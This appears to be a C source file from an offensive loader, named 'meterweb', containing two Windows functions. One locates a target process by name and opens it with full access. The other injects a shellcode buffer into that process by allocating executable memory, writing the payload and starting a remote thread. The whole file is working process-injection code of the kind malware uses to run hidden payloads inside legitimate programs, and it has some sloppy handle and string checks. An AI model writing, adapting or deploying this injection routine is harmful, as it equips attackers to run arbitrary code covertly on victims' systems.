#include "meterweb.h"

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwPID, HANDLE* hProcess)
{
	// <==[Get a handle to a snapshot of all processes]==>
	HANDLE hSnapshot = NULL; // prepare a handle to the snapshot
	printf("[*] taking a snapshot of all processes in the system\n");
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // take a snapshot
	if (hSnapshot == INVALID_HANDLE_VALUE) // check if the snapshot handle is valid
	{
		printf("[!] CreateToolhelp32Snapshot failed: %d\n", GetLastError()); // failed
		goto _EndOfFunction;
	}
	printf("[+] CreateToolhelp32Snapshot succeed\n"); // succeed

	PROCESSENTRY32 Proc = { 0 }; // prepare a PROCESSENTRY32 structure to hold process info
	Proc.dwSize = sizeof(PROCESSENTRY32); // every process will be stored in this structure

	// <==[Get the first process in the snapshot]==>
	printf("[*] getting the first process in the snapshot\n");
	if (!Process32First(hSnapshot, &Proc)) // check if it will return the first process
	{
		printf("[!] Process32First failed: %d\n", GetLastError()); // failed

		goto _EndOfFunction;
	}
	printf("[+] Process32First succeed\n"); // succeed

	// <==[Iterate through all processes in the snapshot]==>
	printf("[*] iterating through all processes in the snapshot\n");
	do
	{
		//printf("[*] checking process: %ws, %ws \n", Proc.szExeFile, szProcessName);

		/*
		* here we convert the process name to lowercase for case-insensitive comparison
		*/
		WCHAR wcLowerName[MAX_PATH * 2] = { 0 }; // initialize a buffer to hold the lowercase process name

		DWORD dwSize = (DWORD)strlen(Proc.szExeFile); // declare the size of the process name
		DWORD i = 0; // initialize a counter

		if (dwSize < MAX_PATH * 2) // check if the name of the process exe file is less than MAX_PATH * 2
		{
			for (; i < dwSize; i++)
			{
				wcLowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
			}
			wcLowerName[i] = L'\0';
		}

		//printf("[*] checking process -after-: %ws, %ws\n", wcLowerName, szProcessName);
		if (wcscmp(Proc.szExeFile, szProcessName) == 0)
		{
			printf("[+] target process found: %ws\n", Proc.szExeFile);

			*dwPID = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
			{
				printf("[!] OpenProcess failed: %d\n", GetLastError());

			}
			printf("[+] OpenProcess succeed: PID %d\n", Proc.th32ProcessID);
			printf("[+] process handle: 0x%p\n", *hProcess);
			printf("[+] PID: %d\n", Proc.th32ProcessID);

			break;
		}
		//printf("[-] nope\n");

	} while (Process32Next(hSnapshot, &Proc));

_EndOfFunction:
	if (hSnapshot != NULL)
		CloseHandle(hSnapshot);
	if (*dwPID == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

BOOL RemoteProcInj(PBYTE bShellcode, SIZE_T sShellcodeSize, DWORD dwPID)
{
	HANDLE hShellcodeAddr = NULL;
	HANDLE hThread = NULL;
	PVOID hProcess = NULL;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	hShellcodeAddr = VirtualAllocEx(
		hProcess, NULL, sShellcodeSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(
		hProcess, hShellcodeAddr,
		bShellcode, sShellcodeSize, NULL);

	hThread = CreateRemoteThread(hProcess, NULL,
		0, hShellcodeAddr, NULL, 0, NULL);

	if (hProcess == INVALID_HANDLE_VALUE ||
		hShellcodeAddr == NULL ||
		hThread == NULL)
	{
		return FALSE;
	}

	printf("[X] 0x%2x\n", hProcess);
	printf("[X] 0x%2x\n", hThread);
	printf("[X] 0x%2x\n", hShellcodeAddr);

	return TRUE;
}

